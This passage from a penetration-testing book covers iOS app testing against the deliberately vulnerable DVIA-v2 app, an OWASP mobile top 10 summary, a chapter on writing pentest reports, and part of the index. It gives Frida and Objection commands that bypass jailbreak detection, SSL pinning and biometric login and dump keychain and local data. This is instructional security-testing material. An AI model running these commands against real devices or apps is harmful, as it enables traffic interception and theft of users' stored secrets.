    5.  Other interesting files such as Assets, Resources, Debug Info, and Native and Non-Native Libs.

# [Setting up proxy](#toc.xhtml#s220a)

The Burp Suite’s proxy configuration method is rather easy to understand and implement. Follow the given steps:

1.  In the `Wi-Fi setting`, enable manual proxy and enter the proxy information, as shown in *[Figure 11.12](#c11.xhtml#fig11_12)*: 
    
    ![](images/Figure-11.12.jpg)
    
    **Figure 11.12:** Wi-Fi setting
    
2.  Go to `Proxy Settings` in the Burp Suite and change the listener to `All Interfaces`, as shown in *[Figure 11.13](#c11.xhtml#fig11_13)*: 
    
    ![](images/Figure-11.13.jpg)
    
    **Figure 11.13:** Proxy settings
    
3.  Now, on the iPhone, open `http://burp` and download the CA certificate.
4.  Install the CA certificate.
5.  Now, navigate to `Settings` | `General` | `About` | `Certificate Trust Settings` and enable `Portswigger CA Certificate`, as shown in *[Figure 11.14](#c11.xhtml#fig11_14)*: 
    
    ![](images/Figure-11.14.jpg)
    
    **Figure 11.14:** Proxy certificate
    

# [Bypassing Jailbreak detection](#toc.xhtml#s221a)

For this demonstration, we will consider a variety of choices for bypassing Jailbreak using Frida and Objection Tools. Keep in mind that the status of the device is Jailbroken, as shown in *[Figure 11.15](#c11.xhtml#fig11_15)*:

![](images/Figure-11.15.jpg)

**Figure 11.15:** Device is Jailbroken

# [Using Frida](#toc.xhtml#s222a)

1.  Run the following command on your system: `frida — codeshare rodnt/ios-jailbreak-bypass -f DVIA-v2`.
2.  Go back to the application and select `Jailbreak 1`, then note that the jailbreak detection has been disregarded, as shown in *[Figure 11.16](#c11.xhtml#fig11_16)*: 
    
    ![](images/Figure-11.16.jpg)
    
    **Figure 11.16:** Device is not Jailbroken using Frida
    

# [Using objection](#toc.xhtml#s223a)

1.  Run the following commands on your system, as shown in *[Figure 11.17](#c11.xhtml#fig11_17)*: 
    
    `objection -g DVIA-v2 explore`
    
    `ios jailbreak disable`
    
    ![](images/Figure-11.17.jpg)
    
    **Figure 11.17:** Objection commands
    
2.  Go back to the application and select `Jailbreak 1`, then note that the jailbreak detection has been disregarded, as shown in *[Figure 11.18](#c11.xhtml#fig11_18):* 
    
    ![](images/Figure-11.18.jpg)
    
    **Figure 11.18:** Device is not Jailbroken using objection
    

The following list includes a variety of tools that can be used to avoid jailbreak detection:

*   **Liberty Lite**: **[https://yalujailbreak.net/liberty-lite/](https://yalujailbreak.net/liberty-lite/)**
*   **A-Bypass**: **[https://repo.co.kr/package/com.rpgfarm.a-bypass](https://repo.co.kr/package/com.rpgfarm.a-bypass)**

# [Bypassing SSL pinning](#toc.xhtml#s224a)

Let us now see how we can bypass the SSL Pinning using various methods.

# [Using Objection](#toc.xhtml#s225a)

1.  Run the following commands on your system, as shown in *[Figure 11.19](#c11.xhtml#fig11_19)*: 
    
    `objection -g DVIA-v2 explore`
    
    `ios sslpinning disable`
    
    ![](images/Figure-11.19.jpg)
    
    **Figure 11.19:** SSLPinning disable using objection
    
2.  Next, go to the program and select `Send Using Certificate Pinning` under `Network Layer Security`.
3.  Note that data can be intercepted by avoiding SSL Pinning. Refer to *[Figure 11.20](#c11.xhtml#fig11_20):*
    
    ![](images/Figure-11.20.jpg)
    
    **Figure 11.20:** Proxy settings
    

The following list includes a variety of tools that can be used to avoid jailbreak detection:

*   **Frida**: **[https://codeshare.frida.re/](https://codeshare.frida.re/)**
*   **SSLKillSwitch2**: **[https://github.com/nabla-c0d3/ssl-kill-switch2](https://github.com/nabla-c0d3/ssl-kill-switch2)**

# [Bypassing biometric (local) authentication](#toc.xhtml#s226a)

Let us now see how we can bypass biometric (local) authentication using various methods.

**Using objection**

1.  Run the following commands on your system, as shown in *[Figure 11.21](#c11.xhtml#fig11_21)*: 
    
    `objection -g DVIA-v2 explore`
    
    `ios ui biometrics_bypass exit`
    
    ![](images/Figure-11.21.jpg)
    
    **Figure 11.21:** Bypassing biometric using objection
    
2.  Next, open the app and select `Touch/Face ID Bypass` | `Start Challenge` | `Swift Implementation`, as shown in *[Figure 11.22](#c11.xhtml#fig11_22):*
    
    ![](images/Figure-11.22.jpg)
    
    **Figure 11.22:** Face not recognized
    
3.  When the application prompts you with `Face Not Recognized`, select `Cancel` to avoid authentication, as shown in *[Figure 11.23](#c11.xhtml#fig11_23):*
    
    ![](images/Figure-11.23.jpg)
    
    **Figure 11.23:** Authentication successful
    

# [Checking for sensitive data exposure in local](#toc.xhtml#s227a)

The sensitive data is kept in local storage in a number of different locations. The different locations where you can locate sensitive data and how to launch an attack are listed as follows.

Open the DVIA-v2 application, then select `Local Data Storage`. Save some data using each of the available choices.

# [Sensitive data in Plist](#toc.xhtml#s228a)

**Case 1: Store sensitive data in Plist.**

Follow the given steps:

1.  Run the following commands: 
    
    `objection -g DVIA-v2 explore`
    
    `env`
    
    `cd /var/mobile/Containers/Data/Application/<app-id>/Documents`
    
    `ios plist cat userInfo.plist`
    
2.  Keep in mind that the sensitive data is kept as plain text, as shown in *[Figure 11.24](#c11.xhtml#fig11_24):* 
    
    ![](images/Figure-11.24.jpg)
    
    **Figure 11.24:** iOS plist cat userInfo.plist command
    

# [Sensitive data in UserDefaults](#toc.xhtml#s229a)

**Case 2: Store Sensitive Data in UserDefaults**

Follow the given steps:

1.  Run the following commands: 
    
    `objection -g DVIA-v2 explore`
    
    `ios nsuserdefaults get`
    
2.  You can see that the sensitive data is contained in the `DemoValue` parameter as plain text, as shown in *[Figure 11.25](#c11.xhtml#fig11_25):*
    
    ![](images/Figure-11.25.jpg)
    
    **Figure 11.25:** iOS “nsuserdefaults get” command
    

# [Sensitive data in keychain](#toc.xhtml#s230a)

**Case 3: Store sensitive data in keychain**

Follow the given steps:

1.  Run the following commands: 
    
    `objection -g DVIA-v2 explore`
    
    `ios keychain dump`
    
2.  Take note that the password is saved in plain text as sensitive data (Super Secure Password), as shown in *[Figure 11.26](#c11.xhtml#fig11_26):*
    
    ![](images/Figure-11.26.jpg)
    
    **Figure 11.26:** iOS keychain dump command
    

For the remaining attacks, we will employ the Grapefruit tool (**[https://github.com/ChiChou/grapefruit](https://github.com/ChiChou/grapefruit)**). Installing, starting, and connecting your iPhone to the application.

# [Sensitive data in core data](#toc.xhtml#s231a)

**Case 4: Store sensitive data in core data**

Follow the given steps:

1.  Open Grapefruit and load the DVIA-v2 application. Go to the following: `Data` | `Library` | `Application Support`.
2.  Open `Model.sqlite`.
3.  Be aware that private data is reachable. Refer to *[Figure 11.27](#c11.xhtml#fig11_27)*: 
    
    ![](images/Figure-11.27.jpg)
    
    **Figure 11.27:** Sensitive data in core data
    

# [Sensitive data in couchbase lite](#toc.xhtml#s232a)

**Case 5: Store sensitive data in couchbase lite**

Follow the given steps:

1.  Load the DVIA-v2 application with Grapefruit and navigate to the following: `Data` | `Library` | `Application Support` | `CouchbaseLite` | `dvcouchbasedb.cblite2`.
2.  Download db.sqlite3, open it, and you will be able to see the sensitive information.

# [Sensitive data in YapDatabase](#toc.xhtml#s233a)

**Case 6: Store sensitive data in YapDatabase**

Follow the given steps:

1.  Load the DVIA-v2 application with Grapefruit and navigate to the following: `Data` | `Library` | `Application Support`.
2.  Download `YapDatabase.sqlite` and open it with SQLite Viewer.
3.  You will be able to access sensitive data.

# [OWASP mobile top 10](#toc.xhtml#s234a)

The OWASP mobile top 10 is a ranking of the security threats that mobile applications face, compiled from research and user feedback.

# [M1: Improper platform usage](#toc.xhtml#s235a)

The first OWASP mobile top 10 category focuses on the areas where an attacker may abuse the security features offered by the iOS platform. Additionally, several security vulnerabilities may occasionally develop as a result of improper platform feature implementation.

Under this area, a number of components, including Biometric Authentication, Keychain, Platform Permission, and so on, must be examined.

# [M2: Insecure data storage](#toc.xhtml#s236a)

Many times, iOS applications save certain data locally in various parts. If an attacker gains access to the user’s physical device, there is a potential that sensitive data will be saved locally and could be used against the user.

Here are a few examples of the general dangers that fall into this category:

*   Sensitive data stored in Plist
*   Sensitive data stored in UserDefaults
*   Sensitive data stored in Keychain
*   Sensitive data stored in core data
*   Sensitive data stored in Webkit Caching
*   Sensitive data stored in Realm
*   Sensitive data stored in Couchbase Lite
*   Sensitive data stored in YapDatabase
*   URL caching (both request and response)
*   Keyboard press caching
*   Copy/paste buffer caching
*   Insecure logging
*   Background screen caching
*   Analytics data sent to third parties

# [M3: Insecure communication](#toc.xhtml#s237a)

Client-server architecture is used for communication in the iOS application. An attacker can try to steal critical information over unencrypted checks, perform Man-in-the-Middle attacks, or try to study the request and answer by capturing them using proxy tools like Burp Suite due to faulty or inadequate implementation of communication standards like communication over HTTP.

Here are a few examples of the general dangers that fall into this category:

*   Lack/bypass-able SSL pinning
*   Communication over HTTP \[unencrypted communication\]
*   Plain-text submission of sensitive information
*   Logging sensitive information in the logs

# [M4: Insecure authentication](#toc.xhtml#s238a)

Applications are typically categorized as having insecure authentication when they either improperly handle authentication checks or permit attackers to modify login/authentication requests in order to access the target user’s account.

Here are a few examples of the general dangers that fall into this category:

*   Guessable/weak/default credentials
*   Authentication bypass using attacks such as injection attacks

# [M5: Insufficient cryptography](#toc.xhtml#s239a)

The user data is frequently stored by iOS applications or used in various client-server queries. An attacker may try to access data that is encrypted using a weak cryptographic approach due to a lack of strong cryptography and obtain sensitive data in this way.

Here are a few examples of the general dangers that fall into this category:

*   Stealing app and user data
*   Accessing encrypted files
*   Accessing encrypted client-server request endpoints

# [M6: Insecure authorization](#toc.xhtml#s240a)

Insecure authorization and unreliable authentication are frequently two checks that lead to confusion. In this attack, it is discussed how to carry out attacks that are outside the user’s level of power and access by taking advantage of the poorly implemented user authorization checks.

Here are a few examples of the general dangers that fall into this category:

*   IDOR
*   Privilege escalation
*   Direct request

# [M7: Client code quality](#toc.xhtml#s241a)

Because of the frequently poor code quality, an attacker may try to send the carefully constructed inputs to function calls made within an app in an effort to execute them or watch the behavior of the program. It might cause some application malfunctions and exploitable situations.

Here are a few examples of the general dangers that fall into this category:

*   Format string vulnerabilities
*   Buffer overflows
*   Remote code execution
*   Memory exhaustion

# [M8: Code tampering](#toc.xhtml#s242a)

An attacker may try to modify the application code and inject malicious code, such as a backdoor, and distribute it using the App Store and other methods, which could result in the theft of sensitive information and compromise of the user’s device as well if the application does not implement the code tampering checks.

Here are a few examples of the general dangers that fall into this category:

*   Malware injection
*   Stealing sensitive data
*   Persistent backdoor

# [M9: Reverse engineering](#toc.xhtml#s243a)

In order to comprehend the application’s code patterns, various function implementations, and to carry out bypass/attacks using a runtime and dynamic instrumentation methodologies, the reverse engineering approach entails studying the binaries and their code using tools like Hopper, otool, and IDA Pro.

One of the typical instances is to examine how SSL Pinning logic is implemented, comprehend the functions responsible for pinning checks, and then use tools like Frida to go around it by creating a custom logic script.

# [M10: Extraneous functionality](#toc.xhtml#s244a)

Typically, the development team stores code before sending an application to production to allow for simple access to the backend server, to provide logs for error analysis, or to store staging and testing information. This code is not necessary for the app to operate. In essence, it is only necessary during the development phase and has no use for the intended usage once the app is in production.

In some circumstances, this code may contain data about databases, user information, user rights, API endpoints, and so on, or it may disable features like two-factor authentication.

# [Conclusion](#toc.xhtml#s245a)

This chapter discussed the principles of iOS penetration testing as well as various methods for avoiding jailbreak detection bypass, biometrics bypass, SSL pinning bypass, and sensitive data exposure in the local storage.

# [Questions](#toc.xhtml#s246a)

1.  How do you bypass SSL pinning?
2.  How do you bypass jailbreak detection?
3.  How bypass biometrics?
4.  How is the exposure to sensitive data in the local storage?

# [CHAPTER 12](#toc.xhtml#c12)

# [Reporting](#toc.xhtml#c12)

# [Introduction](#toc.xhtml#s247a)

We have finally reached the final chapter. Congratulations! You have completed reading the entire book. But before we can rejoice, we need to address one of the most crucial aspects of our wireless penetration test and how to write a professional report for wireless penetration testing.

# [Structure](#toc.xhtml#s248a)

The following topics will be covered in this chapter:

*   Report writing
*   Report writing stages
*   Penetration testing report sample

# [Objectives](#toc.xhtml#s249a)

In this chapter, you will be able to understand how to write a professional penetration testing report.

# [Report writing](#toc.xhtml#s250a)

Writing a report for a penetration test involves many different tasks, including methodology, processes, a correct description of the report’s content and design, a thorough example of the report, and the tester’s own experiences. When the report is finished, it is distributed to the technical team and senior management of the target firms. This report is used as a guide if any future needs of this nature arise.

# [Report writing stages](#toc.xhtml#s251a)

Writing a penetration report involves extensive writing, which is divided into the following stages, as further illustrated in *[Figure 12.1](#c12.xhtml#fig12_1)*:

*   Report planning
*   Information collection
*   Writing the first draft
*   Review and finalization

![](images/Figure-12.1.jpg)

**Figure 12.1:** Report writing stages

# [Report planning](#toc.xhtml#s252a)

Planning a report begins with the objectives, which aid readers in comprehending the key findings of the penetration testing. This section explains the purpose of the testing, the advantages of pen testing, and so on. Second, the time needed for testing is included in the report planning process.

Major elements of report writing are as follows:

*   **Objectives**: It explains the general goal and advantages of pen testing.
*   **Time:** The inclusion of time is crucial because it provides the system’s actual status. Imagine that this report will protect the tester if something goes wrong later because it will show the risks and vulnerabilities present in the penetration testing scope at the time in question.
*   **Target audience:** Target audiences such as information security managers, information technology managers, the chief information security officer, and the technical team should also be included in pen testing reports.
*   **Report classification:** It needs to be appropriately classified because it contains highly secret information such as server IP addresses, application details, vulnerabilities, and threats. However, the target organization’s information categorization policy must be taken into consideration while classifying the information.
*   **Report distribution:** The number of copies and report distribution should be mentioned in the scope of the work. It also needs to mention that the hardcopies can be controlled by printing a limited number of copies attached with their number and the receiver’s name.

# [Information collection](#toc.xhtml#s253a)

Pen testers must list each step to ensure that they have gathered all the information at all testing stages because the procedures are intricate and time-consuming. Along with the methodologies, he must also provide the tools and systems, scan results, vulnerability analyses, specifics of his discoveries, and so on.

# [Writing the first draft](#toc.xhtml#s254a)

Once the tester is equipped with the necessary resources, he must now begin writing the first draught. He must compose the first draught in great detail, including all of the activities, procedures, and experiences.

# [Review and finalization](#toc.xhtml#s255a)

The report must be examined after it has been written, first by the drafter and then by any mentors or colleagues who may have helped. It is required of the reviewer to go through the report in depth and look for any errors that need to be fixed.

# [Content of penetration testing report](#toc.xhtml#s256a)

The typical order format of a penetration testing report is as follows:

*   Executive summary  
    *   Scope of work
    *   Project objectives
    *   Assumption
    *   Timeline
    *   Summary of findings
    *   Summary of recommendation
*   Methodology  
    *   Planning
    *   Exploitation
    *   Reporting
*   Detail findings  
    *   Detailed systems information
    *   Windows server information
*   References  
    *   Appendix

# [Penetration testing report sample](#toc.xhtml#s257a)

This section illustrates the different pages within a penetration testing report sample.

1.  Page 1 is illustrated in *[Figure 12.2](#c12.xhtml#fig12_2):*
    
    ![](images/Figure-12.2.jpg)
    
    **Figure 12.2:** Penetration testing report Page 1
    
2.  Page 2 is illustrated in *[Figure 12.3](#c12.xhtml#fig12_3):*
    
    ![](images/Figure-12.3.jpg)
    
    **Figure 12.3:** Penetration testing report Page 2
    
3.  Page 3 is illustrated in *[Figure 12.4](#c12.xhtml#fig12_4):*
    
    ![](images/Figure-12.4.jpg)
    
    **Figure 12.4:** Penetration testing report Page 3
    
4.  Page 4 is illustrated in *[Figure 12.5](#c12.xhtml#fig12_5):*
    
    ![](images/Figure-12.5.jpg)
    
    **Figure 12.5:** Penetration testing report Page 4
    
5.  Page 5 is illustrated in *[Figure 12.6](#c12.xhtml#fig12_6):*
    
    ![](images/Figure-12.6.jpg)
    
    **Figure 12.6:** Penetration testing report Page 5
    
6.  Page 6 is illustrated in *[Figure 12.7](#c12.xhtml#fig12_7):*
    
    ![](images/Figure-12.7.jpg)
    
    **Figure 12.7:** Penetration testing report Page 6
    
7.  Page 7 is illustrated in *[Figure 12.8](#c12.xhtml#fig12_8):*
    
    ![](images/Figure-12.8.jpg)
    
    **Figure 12.8:** Penetration testing report Page 7
    
8.  Page 8 is illustrated in *[Figure 12.9](#c12.xhtml#fig12_9):*
    
    ![](images/Figure-12.9.jpg)
    
    **Figure 12.9:** Penetration testing report Page 8
    
9.  Page 9 is illustrated in *[Figure 12.10](#c12.xhtml#fig12_10):*
    
    ![](images/Figure-12.10.jpg)
    
    **Figure 12.10:** Penetration testing report Page 9
    
10.  Page 10 is illustrated in *[Figure 12.11](#c12.xhtml#fig12_11):*
     
     ![](images/Figure-12.11.jpg)
     
     **Figure 12.11:** Penetration testing report Page 10
     
11.  Page 11 is illustrated in *[Figure 12.12](#c12.xhtml#fig12_12):*
     
     ![](images/Figure-12.12.jpg)
     
     **Figure 12.12:** Penetration testing report Page 11
     
12.  Page 12 is illustrated in *[Figure 12.13](#c12.xhtml#fig12_13):*
     
     ![](images/Figure-12.13.jpg)
     
     **Figure 12.13:** Penetration testing report Page 12
     
13.  Page 13 is illustrated in *[Figure 12.14](#c12.xhtml#fig12_14):*
     
     ![](images/Figure-12.14.jpg)
     
     **Figure 12.14:** Penetration testing report Page 13
     
14.  Page 14 is illustrated in *[Figure 12.15](#c12.xhtml#fig12_15):*
     
     ![](images/Figure-12.15.jpg)
     
     **Figure 12.15:** Penetration testing report Page 14
     
15.  Page 15 is illustrated in *[Figure 12.16](#c12.xhtml#fig12_16):*
     
     ![](images/Figure-12.16.jpg)
     
     **Figure 12.16:** Penetration testing report Page 15
     

# [Conclusion](#toc.xhtml#s258a)

In this chapter, we went over how to plan a report and how to write one from scratch. It can be difficult to write a report at times, but once you get the feel of it, you will write reports like a professional.

It is my responsibility as the author to give you, my reader, the finest possible reading experience. So now it is time for you! What do you think of this book? Have you learned more than you expected? Was it too complicated or difficult to understand? Did it not offer enough practical examples? Did it seem to you that something was left out? Please feel free to contact me through the **[https://www.bpbonline.com](https://www.bpbonline.com)** page of BPB Online. See you on the other side!

# [Index](#toc.xhtml#ind)

Symbols

802.11 EAP downgrade attack [36](#c02.xhtml#page36)

802.11 identify theft [35](#c02.xhtml#page35)

802.11 LEAP cracking [36](#c02.xhtml#page36)

802.11 password guessing attack [35](#c02.xhtml#page35), [36](#c02.xhtml#page36)

802.11 RADIUS cracking [26](#c02.xhtml#page26)

A

access control attacks [22](#c02.xhtml#page22)

802.11 RADIUS cracking [26](#c02.xhtml#page26)

Ad hoc associations [24](#c02.xhtml#page24), [25](#c02.xhtml#page25)

MAC spoofing [25](#c02.xhtml#page25), [26](#c02.xhtml#page26)

rogue access points [23](#c02.xhtml#page23), [24](#c02.xhtml#page24)

war driving [23](#c02.xhtml#page23)

access point (AP) [23](#c02.xhtml#page23)

configuring [15](#c01.xhtml#page15)\-[17](#c01.xhtml#page17)

connecting [18](#c01.xhtml#page18)\-[20](#c01.xhtml#page20)

active scanning [49](#c03.xhtml#page49)

Ad hoc [24](#c02.xhtml#page24)

advanced wireless attacks

man-in-the-middle attacks [150](#c08.xhtml#page150)\-[159](#c08.xhtml#page159)

Metasploit [160](#c08.xhtml#page160)\-[163](#c08.xhtml#page163)

unencrypted traffic, capturing [150](#c08.xhtml#page150)

Aircrack-ng [14](#c01.xhtml#page14)

Android applications

securing [230](#c10.xhtml#page230)

Android architecture [192](#c10.xhtml#page192)

Android Runtime (ART) [194](#c10.xhtml#page194)

application framework [199](#c10.xhtml#page199)

application layer [200](#c10.xhtml#page200)

Dalvik virtual machine [195](#c10.xhtml#page195)

Java virtual machine [195](#c10.xhtml#page195)

Linux kernel [193](#c10.xhtml#page193)

zygote [196](#c10.xhtml#page196)

Android Debug Bridge [207](#c10.xhtml#page207)

application, installing on device [209](#c10.xhtml#page209)

apps, sideloading [212](#c10.xhtml#page212)

device access, gaining [208](#c10.xhtml#page208), [209](#c10.xhtml#page209)

device, connecting [208](#c10.xhtml#page208)

device, stopping [211](#c10.xhtml#page211)

files, extracting from device [210](#c10.xhtml#page210)

files, storing to device [210](#c10.xhtml#page210)

log information, viewing [211](#c10.xhtml#page211)

Android penetration testing [191](#c10.xhtml#page191)

Android penetration testing environment setup [201](#c10.xhtml#page201)

Android Debug Bridge [207](#c10.xhtml#page207)

Android SDK [206](#c10.xhtml#page206)

Android Studio [201](#c10.xhtml#page201)

Genymotion [212](#c10.xhtml#page212)

proxy, setting up in Wi-Fi settings [224](#c10.xhtml#page224)\-[226](#c10.xhtml#page226)

proxy, setting up on mobile carrier settings [226](#c10.xhtml#page226)

Android penetration testing tools [227](#c10.xhtml#page227)

Android Debug Bridge (ADB) [227](#c10.xhtml#page227)

d2j-dex2jar [228](#c10.xhtml#page228)

Drozer [228](#c10.xhtml#page228)

JD-GUI [229](#c10.xhtml#page229)

MobSF [227](#c10.xhtml#page227)

Objection [229](#c10.xhtml#page229)

Android Runtime (ART) [194](#c10.xhtml#page194)\-[196](#c10.xhtml#page196)

compiling [197](#c10.xhtml#page197)

Android SDK [206](#c10.xhtml#page206)

Android Studio [201](#c10.xhtml#page201)

downloading [202](#c10.xhtml#page202)

installing [203](#c10.xhtml#page203)\-[206](#c10.xhtml#page206)

prerequisites [202](#c10.xhtml#page202)

Android Virtual Device (AVD) manager [212](#c10.xhtml#page212)

Android virtual emulator

configuring, for HTTP proxy [223](#c10.xhtml#page223), [224](#c10.xhtml#page224)

creating [216](#c10.xhtml#page216)\-[218](#c10.xhtml#page218)

AP phishing [29](#c02.xhtml#page29)

application framework, Android

activity manager [199](#c10.xhtml#page199)

content provider [199](#c10.xhtml#page199)

location manager [200](#c10.xhtml#page200)

notifications manager [199](#c10.xhtml#page199)

package manager [199](#c10.xhtml#page199)

resource manager [199](#c10.xhtml#page199)

telephony manager [200](#c10.xhtml#page200)

view system [199](#c10.xhtml#page199)

window manager [200](#c10.xhtml#page200)

application layer, Android

Native Android or system apps [200](#c10.xhtml#page200)

user-installed or custom apps [200](#c10.xhtml#page200)

authentication attacks

802.11 EAP downgrade attack [36](#c02.xhtml#page36), [37](#c02.xhtml#page37)

802.11 identify theft [35](#c02.xhtml#page35)

802.11 LEAP cracking [36](#c02.xhtml#page36)

802.11 password guessing [35](#c02.xhtml#page35)

application credentials, sniffing [33](#c02.xhtml#page33)

domain accounts, cracking [34](#c02.xhtml#page34)

PSK cracking [32](#c02.xhtml#page32)

shared key guessing [32](#c02.xhtml#page32)

VPN login cracking [34](#c02.xhtml#page34)

Authenticator MAC address (Access PointMAC) [69](#c04.xhtml#page69)

Authenticator Nounce (ANounce) [69](#c04.xhtml#page69)

B

Burp Suite [223](#c10.xhtml#page223)

C

client-side attacks

cross-site scripting (XSS) [130](#c07.xhtml#page130)

honeypot attacking [136](#c07.xhtml#page136)

spoofing [130](#c07.xhtml#page130)

types [130](#c07.xhtml#page130), [131](#c07.xhtml#page131)

unencrypted traffic, sniffing [131](#c07.xhtml#page131)\-[136](#c07.xhtml#page136)

working [128](#c07.xhtml#page128)\-[130](#c07.xhtml#page130)

confidential attacks

AP phishing [29](#c02.xhtml#page29)

eavesdropping [27](#c02.xhtml#page27)

evil twin AP [28](#c02.xhtml#page28)

man-in-the-middle attack [30](#c02.xhtml#page30)

WEP key cracking [27](#c02.xhtml#page27), [28](#c02.xhtml#page28)

core Java libraries [196](#c10.xhtml#page196)

credential attacks [30](#c02.xhtml#page30)

credential harvester [30](#c02.xhtml#page30)

phishing [31](#c02.xhtml#page31)

credential harvester [30](#c02.xhtml#page30)

cross-site scripting (XSS) [130](#c07.xhtml#page130)

D

d2j-dex2jar [228](#c10.xhtml#page228)

Dalvik Virtual Machine (DVM) [194](#c10.xhtml#page194)\-[196](#c10.xhtml#page196)

double pivoting [185](#c09.xhtml#page185), [186](#c09.xhtml#page186)

ProxyChains [186](#c09.xhtml#page186)\-[189](#c09.xhtml#page189)

Drozer [228](#c10.xhtml#page228)

dsniff [55](#c03.xhtml#page55)\-[57](#c03.xhtml#page57)

DVM-specific libraries [196](#c10.xhtml#page196)

Dynamic Host Configuration Protocol (DHCP) [142](#c07.xhtml#page142)

E

easy file share BoF [182](#c09.xhtml#page182)\-[185](#c09.xhtml#page185)

eavesdropping [27](#c02.xhtml#page27)

Ettercap [51](#c03.xhtml#page51)\-[55](#c03.xhtml#page55)

evil twin AP [28](#c02.xhtml#page28)

F

fake access point (fake Wi-Fi)

starting [138](#c07.xhtml#page138)\-[146](#c07.xhtml#page146)

Federal Communications Commission (FCC) [49](#c03.xhtml#page49)

first pivot and port forwarding

compromising [170](#c09.xhtml#page170)\-[172](#c09.xhtml#page172)

footprinting [40](#c03.xhtml#page40), [41](#c03.xhtml#page41)

G

Genymotion [212](#c10.xhtml#page212)

ARM apps and play store [221](#c10.xhtml#page221)\-[223](#c10.xhtml#page223)

installing [213](#c10.xhtml#page213)\-[215](#c10.xhtml#page215)

Genymotion emulator

application, installing [219](#c10.xhtml#page219)

Genymotion plugin

installing, to Android Studio [220](#c10.xhtml#page220), [221](#c10.xhtml#page221)

Global Positioning Systems (GPS) [23](#c02.xhtml#page23)

H

honeypot attacking [136](#c07.xhtml#page136)

protecting from [137](#c07.xhtml#page137), [138](#c07.xhtml#page138)

hosts

identifying [82](#c05.xhtml#page82)

vulnerable hosts, detecting [85](#c05.xhtml#page85)\-[101](#c05.xhtml#page101)

I

Integrated Development Environment (IDE) [201](#c10.xhtml#page201)

intrusion detection system (IDS) [137](#c07.xhtml#page137)

iOS application [240](#c11.xhtml#page240)

architecture [240](#c11.xhtml#page240)

IPA file structure [241](#c11.xhtml#page241)

testing methodology [245](#c11.xhtml#page245)

vulnerable applications [245](#c11.xhtml#page245)

iOS application Sandbox structure [242](#c11.xhtml#page242), [243](#c11.xhtml#page243)

Jailbreak [243](#c11.xhtml#page243), [244](#c11.xhtml#page244)

iOS architecture

Cocoa touch (application) [241](#c11.xhtml#page241)

core OS [241](#c11.xhtml#page241)

core services [241](#c11.xhtml#page241)

media [241](#c11.xhtml#page241)

iOS penetration testing [239](#c11.xhtml#page239)

J

Jailbreak [243](#c11.xhtml#page243)

semi-tethered Jailbreak [244](#c11.xhtml#page244)

semi-untethered Jailbreak [244](#c11.xhtml#page244)

tethered Jailbreak [243](#c11.xhtml#page243)

untethered Jailbreak [243](#c11.xhtml#page243)

Java interoperability libraries [196](#c10.xhtml#page196)

Java virtual machine (JVM) [194](#c10.xhtml#page194), [195](#c10.xhtml#page195)

JD-GUI [229](#c10.xhtml#page229)

K

Kali Linux

downloading [5](#c01.xhtml#page5)

installing, in VMware [6](#c01.xhtml#page6)\-[11](#c01.xhtml#page11)

KFSensor [137](#c07.xhtml#page137)

L

Linux

versus Linux kernel [194](#c10.xhtml#page194)

Linux kernel [193](#c10.xhtml#page193)

M

MAC spoofing [25](#c02.xhtml#page25)

man-in-the-middle attack [30](#c02.xhtml#page30)

protecting from [137](#c07.xhtml#page137), [138](#c07.xhtml#page138)

Message Integrity Check (MIC) [70](#c04.xhtml#page70)

Metasploit [15](#c01.xhtml#page15), [160](#c08.xhtml#page160)\-[163](#c08.xhtml#page163)

mitigations [189](#c09.xhtml#page189)

Mobile Security Framework (MobSF) [227](#c10.xhtml#page227)

MS08-067, with bind TCP [180](#c09.xhtml#page180), [181](#c09.xhtml#page181)

N

Native Development Kit (NDK) [197](#c10.xhtml#page197)

native libraries [197](#c10.xhtml#page197)

Freetype [198](#c10.xhtml#page198)

libc [198](#c10.xhtml#page198)

media framework [198](#c10.xhtml#page198)

OpenGL ES [198](#c10.xhtml#page198)

Secure Socket Layer (SSL) [198](#c10.xhtml#page198)

SGL [198](#c10.xhtml#page198)

SQLite [198](#c10.xhtml#page198)

surface manager [198](#c10.xhtml#page198)

WebKit [198](#c10.xhtml#page198)

Nessus

downloading [108](#c06.xhtml#page108)

installing [108](#c06.xhtml#page108)\-[115](#c06.xhtml#page115)

Nessus Essentials [111](#c06.xhtml#page111)

Nessus Professional [111](#c06.xhtml#page111)

Nessus vulnerability scan

configuring [118](#c06.xhtml#page118)\-[120](#c06.xhtml#page120)

launching [121](#c06.xhtml#page121)\-[123](#c06.xhtml#page123)

policy, configuring [116](#c06.xhtml#page116), [117](#c06.xhtml#page117)

reports, generating [123](#c06.xhtml#page123)\-[125](#c06.xhtml#page125)

running [115](#c06.xhtml#page115)

Network Mapper (Nmap) [13](#c01.xhtml#page13), [14](#c01.xhtml#page14), [41](#c03.xhtml#page41)

commands [42](#c03.xhtml#page42)\-[48](#c03.xhtml#page48)

via pivoting [172](#c09.xhtml#page172)\-[175](#c09.xhtml#page175)

network mapping tools [82](#c05.xhtml#page82)

for identifying hosts [83](#c05.xhtml#page83), [84](#c05.xhtml#page84)

network size

determining [85](#c05.xhtml#page85)

determining, with Kali Linux [85](#c05.xhtml#page85)

O

Objection [229](#c10.xhtml#page229)

Original Equipment Manufacturer (OEM) [198](#c10.xhtml#page198)

OWASP mobile vulnerabilities, Android [230](#c10.xhtml#page230), [231](#c10.xhtml#page231)

client code quality [235](#c10.xhtml#page235), [236](#c10.xhtml#page236)

code tampering [236](#c10.xhtml#page236)

extraneous functionality [236](#c10.xhtml#page236), [237](#c10.xhtml#page237)

improper platform usage [231](#c10.xhtml#page231), [232](#c10.xhtml#page232)

insecure authentication [233](#c10.xhtml#page233), [234](#c10.xhtml#page234)

insecure authorization [234](#c10.xhtml#page234), [235](#c10.xhtml#page235)

insecure communication [233](#c10.xhtml#page233)

insecure data storage [232](#c10.xhtml#page232), [233](#c10.xhtml#page233)

insufficient cryptography [234](#c10.xhtml#page234)

reverse engineering [236](#c10.xhtml#page236)

OWASP mobile vulnerabilities, iOS [258](#c11.xhtml#page258)

client code quality [260](#c11.xhtml#page260)

code tampering [260](#c11.xhtml#page260)

extraneous functionality [261](#c11.xhtml#page261)

improper platform usage [258](#c11.xhtml#page258)

insecure authentication [259](#c11.xhtml#page259)

insecure authorization [259](#c11.xhtml#page259), [260](#c11.xhtml#page260)

insecure communication [259](#c11.xhtml#page259)

insecure data storage [258](#c11.xhtml#page258)

insufficient cryptography [259](#c11.xhtml#page259)

reverse engineering [260](#c11.xhtml#page260), [261](#c11.xhtml#page261)

OWASP ZAP [224](#c10.xhtml#page224)

P

Pairwise Master Key (PMK) [75](#c04.xhtml#page75)

Pairwise Transient Key (PTK) [69](#c04.xhtml#page69)

